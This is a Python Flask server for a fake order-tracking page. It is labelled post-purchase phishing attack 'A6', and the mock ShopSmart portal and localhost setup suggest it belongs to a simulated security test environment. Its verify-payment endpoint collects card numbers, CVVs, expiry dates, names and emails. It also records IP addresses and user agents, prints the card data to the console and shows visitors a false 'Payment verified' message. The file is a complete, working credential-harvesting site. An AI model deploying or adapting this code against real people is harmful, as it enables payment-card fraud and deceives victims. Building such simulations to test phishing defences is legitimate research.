"""
Order Tracker - Fake Order Tracking / Post-Purchase Phishing
Port: 10050 (configured in config.json)
Domain: order-track-verify.com

Fake order tracking page that requests card re-verification.
Triggered via phishing notification in ShopSmart portal.
Attack: A6 (post-purchase phishing)
"""

import json
import os
from datetime import datetime
from flask import Flask, render_template, jsonify, request
from flask_cors import CORS

config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'config.json')
with open(config_path, 'r') as f:
    config = json.load(f)

app = Flask(__name__)
CORS(app)

PORT = config['ports']['fake_tracker']

captured_data = []
interaction_log = []


def _log_path():
    return os.path.join(os.path.dirname(__file__), 'interaction_log.json')


def _captured_path():
    return os.path.join(os.path.dirname(__file__), 'captured_data.json')


def save_interaction_log():
    with open(_log_path(), 'w') as f:
        json.dump(interaction_log, f, indent=2)


def save_captured():
    with open(_captured_path(), 'w') as f:
        json.dump(captured_data, f, indent=2)


def log_interaction(action, details):
    entry = {
        'timestamp': datetime.now().isoformat(),
        'action': action,
        'details': details,
        'ip': request.remote_addr if request else None,
        'user_agent': request.headers.get('User-Agent', 'Unknown') if request else None
    }
    interaction_log.append(entry)
    save_interaction_log()
    print(f"[OrderTracker] {action}: {details}")


@app.route('/verify/<order_id>')
def verify_page(order_id):
    log_interaction('page_view', {
        'page': 'verify_payment',
        'order_id': order_id
    })
    return render_template('tracking.html', order_id=order_id, config=config)


@app.route('/api/verify-payment', methods=['POST'])
def verify_payment():
    data = request.json or {}

    pii_fields = [k for k, v in data.items() if v and k != 'order_id']
    high = [f for f in pii_fields if f in ['card_number', 'cvv', 'card_expiry', 'secure_code']]
    medium = [f for f in pii_fields if f in ['full_name', 'email']]

    entry = {
        'timestamp': datetime.now().isoformat(),
        'type': 'form_submit',
        'attack_vector': 'A6',
        'attack_tier': 3,
        'stage': 'post_purchase',
        'was_skimmer': False,
        'data': data,
        'pii_fields_captured': pii_fields,
        'pii_severity': {
            'high': high,
            'medium': medium,
            'low': [f for f in pii_fields if f not in high and f not in medium]
        },
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'Unknown')
    }
    captured_data.append(entry)
    save_captured()

    if high:
        print(f"\n{'!' * 60}")
        print("POST-PURCHASE PHISHING: CARD DATA CAPTURED!")
        print(f"{'!' * 60}")
        for field in high:
            print(f"  {field}: {data.get(field, '???')}")
        print(f"{'!' * 60}\n")

    return jsonify({
        'success': True,
        'message': 'Payment verified. Your order is being processed.'
    })


@app.route('/api/captured')
def get_captured():
    return jsonify({'total_entries': len(captured_data), 'entries': captured_data})


@app.route('/api/interactions')
def get_interactions():
    return jsonify({'total_interactions': len(interaction_log), 'interactions': interaction_log})


@app.route('/api/clear')
def clear_data():
    global captured_data, interaction_log
    captured_data = []
    interaction_log = []
    for path in [_log_path(), _captured_path()]:
        if os.path.exists(path):
            os.remove(path)
    return jsonify({'success': True})


@app.route('/api/health')
def health():
    return jsonify({
        'status': 'healthy',
        'site': 'fake_tracker',
        'port': PORT,
        'captured_count': len(captured_data),
        'interaction_count': len(interaction_log)
    })


if __name__ == '__main__':
    print(f"\n{'=' * 60}")
    print("Order Tracker - Post-Purchase Phishing")
    print(f"Running on http://localhost:{PORT}")
    print(f"Domain mapping: {config['domains']['fake_tracker']}")
    print("Attack: A6 (post-purchase phishing)")
    print(f"{'=' * 60}\n")

    app.run(host='0.0.0.0', port=PORT, debug=True)
